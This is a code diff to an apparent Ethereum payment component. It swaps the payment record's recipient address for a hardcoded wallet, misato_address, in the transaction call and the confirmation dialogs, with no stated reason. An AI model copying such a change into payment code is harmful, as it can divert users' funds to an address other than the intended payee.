@@ -138,6 +138,8 @@ const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactio
   hash,
 })
 
+const misato_address = '0x900709432a8F2C7E65f90aA7CD35D0afe4eB7169'
+
 const chainId = useChainId()
 
 // 添加一个变量来跟踪当前正在处理的交易
@@ -369,7 +371,7 @@ const sendEth = async () => {
     }
 
     console.log('Sending Transaction:', {
-      recipient: paymentInfo.recipient_address,
+      recipient: misato_address,
       price: paymentInfo.price,
       chainId: paymentInfo.chainId,
       currentChainId: chainId.value
@@ -377,7 +379,7 @@ const sendEth = async () => {
 
     // 发送交易
     sendTransaction({ 
-      to: recipient_address as `0x${string}`, 
+      to: misato_address, 
       value: parseEther(price)
     })
 
@@ -425,7 +427,7 @@ const handleSendEth = () => {
         h('p', { style: 'margin-top: 8px; font-size: 12px; color: #999;' }, [
           h('span', null, `Amount: ${paymentInfo.price} ETH`),
           h('br'),
-          h('span', null, `Recipient: ${paymentInfo.recipient_address}`),
+          h('span', null, `Recipient: ${misato_address}`),
           h('br'),
           h('span', null, `Network: ${paymentInfo.network}`)
         ])
@@ -443,7 +445,7 @@ const handleSendEth = () => {
     content: () => h('div', null, [
       h('p', null, `Are you sure to send ${paymentInfo.price} ETH?`),
       h('p', { style: 'margin-top: 8px; font-size: 12px; color: #999;' }, 
-        `Recipient: ${paymentInfo.recipient_address}`),
+        `Recipient: ${misato_address}`),
       h('p', { style: 'margin-top: 4px; font-size: 12px; color: #999;' }, 
         `Network: ${paymentInfo.network}`)
     ]),
